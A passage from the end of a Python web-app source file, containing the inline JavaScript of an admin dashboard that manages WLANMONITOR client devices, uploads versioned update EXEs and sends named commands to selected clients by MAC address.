    <script>function parseExeMarkersFromText(text){const version=(text.match(/WLANMONITOR_BUILD_VERSION=([0-9][0-9A-Za-z._-]*)/)||[])[1]||'';const channel=(text.match(/WLANMONITOR_BUILD_CHANNEL=(stable|test)/)||[])[1]||'';return {version,channel}}document.addEventListener('DOMContentLoaded',()=>{const f=document.getElementById('update-form');const input=document.getElementById('main-exe-input');const hint=document.getElementById('release-hint');if(input)input.addEventListener('change',()=>{const file=input.files&&input.files[0];if(!file){if(hint)hint.innerText='Version and channel are read from the uploaded EXE.';return}const reader=new FileReader();reader.onload=()=>{const data=parseExeMarkersFromText(reader.result||'');if(hint)hint.innerText=data.version&&data.channel?('Detected '+data.channel+' version '+data.version+'. Server will publish to '+data.channel+' tunnel.'):('No build marker detected. Server will reject this EXE.')};reader.readAsBinaryString(file)});if(f)f.addEventListener('submit',e=>{const file=f.querySelector('input[name=file]');if(!file||!file.files.length){alert('Please upload the main EXE.');e.preventDefault();return}if(!confirm('Upload EXE and let server read version/channel automatically?'))e.preventDefault()})});let isUserInteracting=false;window.addEventListener('touchstart',()=>{isUserInteracting=true},{passive:true});window.addEventListener('touchend',()=>setTimeout(()=>{isUserInteracting=false},1000));window.addEventListener('mousedown',()=>{isUserInteracting=true});window.addEventListener('mouseup',()=>setTimeout(()=>{isUserInteracting=false},1000));function checkedValues(s){return Array.from(document.querySelectorAll(s+':checked')).map(c=>c.value)}function fetchTables(){if(isUserInteracting)return;const on=checkedValues('.online-client-check'),off=checkedValues('.offline-client-check'),sp=Array.from(document.querySelectorAll('.table-scroll')).map(c=>c.scrollLeft);fetch('/tables_partial',{credentials:'same-origin'}).then(r=>{if(!r.ok)throw new Error('tables refresh failed');return r.text()}).then(html=>{if(!html.trim())return;document.getElementById('target-tables').innerHTML=html;document.querySelectorAll('.online-client-check').forEach(c=>c.checked=on.includes(c.value));document.querySelectorAll('.offline-client-check').forEach(c=>c.checked=off.includes(c.value));document.querySelectorAll('.table-scroll').forEach((c,i)=>{if(sp[i]!==undefined)c.scrollLeft=sp[i]})}).catch(()=>{})}setInterval(fetchTables,3000);window.toggleTest=mac=>fetch('/api/toggle_test',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac})}).then(fetchTables);window.toggleWifiExempt=(mac,enabled)=>fetch('/api/wifi_shutdown_exempt/'+mac,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled})}).then(fetchTables);window.promptRename=(mac,oldname)=>{const name=prompt('Rename device:',oldname);if(name&&name!==oldname)fetch('/api/rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac,name})}).then(fetchTables)};window.deleteClient=mac=>{if(!confirm('Delete this device record?'))return;fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac})}).then(fetchTables)};window.batchDeleteOffline=()=>{const macs=checkedValues('.offline-client-check');if(!macs.length)return alert('Select offline records first.');if(!confirm('Delete '+macs.length+' offline record(s)?'))return;fetch('/api/batch_delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({macs})}).then(fetchTables)};window.toggleOnlineAll=()=>{const b=document.querySelectorAll('.online-client-check'),yes=Array.from(b).some(c=>!c.checked);b.forEach(c=>c.checked=yes)};window.toggleOfflineAll=()=>{const b=document.querySelectorAll('.offline-client-check'),yes=Array.from(b).some(c=>!c.checked);b.forEach(c=>c.checked=yes)};window.showMainContextMenu=e=>{e.preventDefault();const box=e.currentTarget.querySelector('.online-client-check');if(box&&!box.checked)box.checked=true;const menu=document.getElementById('main-context');if(menu){menu.style.display='block';menu.style.left=e.pageX+'px';menu.style.top=e.pageY+'px'}};window.hideMainContextMenu=()=>{const menu=document.getElementById('main-context');if(menu)menu.style.display='none'};window.onMainContextAction=cmd=>{hideMainContextMenu();window.batchCmd(cmd)};window.quickCmd=(mac,cmd)=>{if(!confirm('Run '+cmd+' on this client?'))return;fetch('/api/send_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac,cmd})}).then(()=>alert('Sent.'))};window.batchCmd=cmd=>{const macs=checkedValues('.online-client-check');if(!macs.length)return alert('Select online devices first.');if(!confirm('Run '+cmd+' on '+macs.length+' device(s)?'))return;fetch('/api/batch_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({macs,cmd})}).then(()=>alert('Sent.'))};</script></body></html>
    """
    return render_template_string(html_template, current_server_version=current_server_version, current_test_version=current_test_version, stable_history_versions=stable_history_versions, test_history_versions=test_history_versions, initial_tables=render_device_tables())
